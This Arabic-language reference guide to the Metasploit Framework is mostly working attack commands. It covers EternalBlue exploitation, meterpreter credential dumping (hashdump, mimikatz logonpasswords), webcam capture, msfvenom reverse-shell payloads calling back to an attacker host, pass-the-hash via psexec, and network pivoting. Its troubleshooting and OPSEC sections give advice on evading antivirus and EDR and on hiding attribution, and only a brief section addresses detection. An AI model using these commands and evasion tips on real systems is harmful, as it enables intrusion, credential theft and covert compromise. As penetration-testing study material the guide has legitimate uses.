# إطار عمل ميتاسبلويت (Metasploit Framework) — الدليل الشامل

يُعد ميتاسبلويت إطار عمل الاستغلال (Exploitation Framework) الأكثر انتشاراً عالمياً، حيث يضم أكثر من 6,000 ثغرة (Exploits)، و4,500 وحدة لما بعد الاستغلال (Post-modules)، و2,000 وحدة مساعدة (Auxiliary modules). ويمثل المرجع الفعلي (De-facto) لتنفيذ إثباتات الاختراق (PoC) لكل ثغرة (CVE) معروفة.

## التثبيت (Install)

```terminal
curl -fsSL https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb | sudo bash
# أو كجزء من توزيعات Kali / Parrot
msfconsole
```

عند التشغيل الأول، يقوم الإطار بتهيئة قاعدة بيانات PostgreSQL؛ يمكن التأكد من الحالة عبر أمر `db_status`.

## أنواع الوحدات (Module types)

| النوع | بادئة المسار | الغرض |
|------|------------|---------|
| `exploit` | `exploit/<os>/<service>/...` | الحصول على جلسة اختراق (Session) |
| `payload` | `payload/<os>/<arch>/...` | الكود الذي يتم تشغيله على الهدف (Payload) |
| `auxiliary` | `auxiliary/scanner/...` | أدوات الفحص، الهجوم العنيف (Brute-force)، وجمع المعلومات |
| `post` | `post/<os>/...` | عمليات ما بعد الاستغلال ضد جلسة نشطة |
| `encoder` | `encoder/...` | تعمية وتشفير الحمولة (Obfuscate payload) |
| `evasion` | `evasion/...` | توليد حمولات لتجاوز برامج مكافحة الفيروسات (AV) |
| `nop` | `nop/...` | مولدات تعليمات NOP (NOP sled generators) |

## أساسيات الكونسول (Console basics)

```
msf6 > search type:exploit name:eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > info
msf6 exploit(...) > options
msf6 exploit(...) > set RHOSTS 10.0.0.5
msf6 exploit(...) > set LHOST 10.0.0.99
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > check
msf6 exploit(...) > run
```

أوامر الكونسول المفيدة: `back` (للعودة)، `sessions` (عرض الجلسات)، `sessions -i 1` (التفاعل مع جلسة)، `jobs` (المهام الخلفية)، `kill <id>` (إنهاء مهمة)، `setg` (تعيين متغير عام)، `unset` (إلغاء تعيين)، `save` (حفظ الإعدادات)، `irb` (فتح بيئة Ruby REPL داخل حالة MSF).

## التكامل مع قاعدة البيانات (Database integration)

```
msf6 > db_status
msf6 > workspace -a engagement-2026-04
msf6 > db_nmap -sV -sC -oA scan target.com
msf6 > hosts
msf6 > services
msf6 > vulns
msf6 > creds
msf6 > loot
```

يقوم `db_nmap` بتشغيل Nmap واستيراد النتائج مباشرة — مما يجعل كل مضيف (Host) أو خدمة (Service) قابلاً للاستعلام.

## الجلسات والميتربريتر (Sessions & meterpreter)

```
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getsystem
meterpreter > hashdump
meterpreter > screenshot
meterpreter > webcam_snap
meterpreter > load kiwi      # استخدام mimikatz داخل الذاكرة
meterpreter > kiwi_cmd "sekurlsa::logonpasswords"
meterpreter > load extapi
meterpreter > clipboard_get_data
meterpreter > portfwd add -l 9000 -p 3389 -r 10.0.0.5
meterpreter > route add 10.0.0.0/24 1
meterpreter > download / upload
meterpreter > shell           # الانتقال لصدفة نظام التشغيل (OS Shell)
meterpreter > migrate <pid>   # الانتقال إلى عملية مستقرة (Process)
```

## msfvenom — باني الحمولات (Payload builder)

```terminal
# إنشاء حمولة Meterpreter عكسية لنظام ويندوز بتنسيق EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f exe -o pwn.exe

# أمر PowerShell stager سطر واحد
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=... LPORT=443 -f psh-cmd

# نظام لينكس
msfvenom -p linux/x64/shell_reverse_tcp LHOST=... LPORT=4444 -f elf -o pwn

# بايثون
msfvenom -p python/meterpreter/reverse_tcp LHOST=... LPORT=4444 -f raw -o pwn.py

# التشفير (نادر الاستخدام حالياً؛ لم تعد توقيعات AV تتأثر به كثيراً)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=... -e x64/xor -i 5 -f exe -o pwn.exe
```

## الوحدات الشائعة (Common modules)

| الوحدة | الاستخدام |
|--------|-----|
| `auxiliary/scanner/smb/smb_login` | هجوم "SMB password spray" |
| `auxiliary/scanner/ssh/ssh_login` | الهجوم العنيف على SSH |
| `auxiliary/scanner/portscan/tcp` | فحص المنافذ TCP (بطيء، يفضل Nmap) |
| `auxiliary/admin/smb/psexec_command` | تنفيذ أمر psexec لمرة واحدة |
| `exploit/multi/handler` | استقبال اتصالات الحمولات (Listener) |
| `exploit/windows/smb/psexec` | تقنية Pass-the-hash عبر psexec |
| `post/multi/manage/shell_to_meterpreter` | ترقية الصدفة (Shell) إلى Meterpreter |
| `post/windows/gather/credentials/...` | وحدات حصد بيانات الاعتماد |
| `post/windows/gather/hashdump` | استخراج هاشات (Hashes) قاعدة SAM |
| `post/multi/recon/local_exploit_suggester` | توصيات لتصعيد الصلاحيات (LPE) |

## سير العمل (Workflows)

### استقبال اتصال Meterpreter

```
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 > set LHOST 0.0.0.0
msf6 > set LPORT 443
msf6 > set ExitOnSession false
msf6 > exploit -j
```

الخيار `-j` يقوم بتشغيل المهمة في الخلفية (Background job).

### تنفيذ Pass-the-hash باستخدام psexec

```
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS 10.0.0.5
msf6 > set SMBUser administrator
msf6 > set SMBPass aad3b435...:5e5a04...
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 > run
```

### التوجيه المحوري (Pivot) عبر Meterpreter

```
meterpreter > run autoroute -s 10.0.0.0/24
msf6 > use auxiliary/server/socks_proxy
msf6 > run
# الآن من داخل نظام لينكس: proxychains4 nmap -sT 10.0.0.5
```

## المشكلات الشائعة وحلولها

| العرض | السبب | الحل |
|---------|-------|-----|
| `[-] Exploit failed: NoMethodError` | خطأ برمي في الوحدة أو عدم تلبية متطلبات الهدف | تحقق من `info` و `show targets` وحدد الهدف الصحيح |
| `[-] Handler failed to bind` | المنفذ مستخدم بالفعل | استخدم `netstat -plnt`؛ أنهِ العملية أو غير `LPORT` |
| ظهور `[*] Sending stage` دون جلسة | تم حظر المرحلة بواسطة EDR / AV | استخدم حمولة `stageless`؛ حمولة HTTPS؛ أو Reflective DLL |
| تعليق `db_nmap` | عدم تطابق في هيكل قاعدة البيانات (Schema) | `msfdb reinit` لإعادة تهيئة قاعدة البيانات |
| انقطاع الجلسة بعد الانتقال (Migration) | إنهاء العملية الأب قبل استقرار الانتقال | استخدم الانتقال بالاسم: `migrate -N explorer.exe` |

## منظور المدافع (Defender's perspective)

- يتضمن Meterpreter الافتراضي سلاسل نصية (PE strings) معروفة تكتشفها برامج مكافحة الفيروسات (AV).
- اتصالات Reverse TCP/HTTP دون تمويه تكتشفها أنظمة كشف التسلل (IDS).
- وحدات `psexec` / `wmiexec` تترك أسماء خدمات وملفات متوقعة.
- عمليات الانتقال (Migrate) وحقن العمليات (Process Injection) تولد الحدث Sysmon EID 8 (CreateRemoteThread).

أفكار للكشف:
- توقيعات AV على مخرجات msfvenom الخام.
- قواعد Suricata: قواعد ET-Open تغطي أنماط مصافحة Meterpreter (أطوال URIs محددة، TLS JA3).
- Sysmon EID 1: عملية ابنة لـ `services.exe` باسم عشوائي قصير ← مشبوهة.

## أمن العمليات (OPSEC)

- مخرجات msfvenom الافتراضية مكشوفة لكل برامج الـ AV — **دائماً** قم بالتخصيص: غير User-Agent، استخدم HTTPS مع ربط الشهادة (Cert pinning)، شفر الـ C2 باستخدام RC4 مخصص، أو استخدم `unicorn` / `donut` لإعادة التغليف.
- للاختبارات الحساسة: انتقل إلى Sliver أو Mythic أو Cobalt Strike مع ملفات تعريف (Malleable profiles).
- لا تشغل `msfconsole` من عنوان IP الحقيقي الخاص بك إذا كان نطاق العمل يهتم بالهوية (Attribution).

## أدوات ذات صلة

| الأداة | الفرق |
|------|-----------|
| **Cobalt Strike** | تجاري، يدعم ملفات تعريف C2 مرنة (Malleable) |
| **Sliver** | مفتوح المصدر، حديث، مرن، متعدد البروتوكولات |
| **Mythic** | مفتوح المصدر، مستقل عن الوكيل (Agent-agnostic)، واجهة ويب |
| **PowerSploit / Empire** | مركزة على PowerShell (شبه متوقفة) |
| **Havoc / Brute Ratel** | أدوات C2 حديثة تجارية ومفتوحة المصدر |
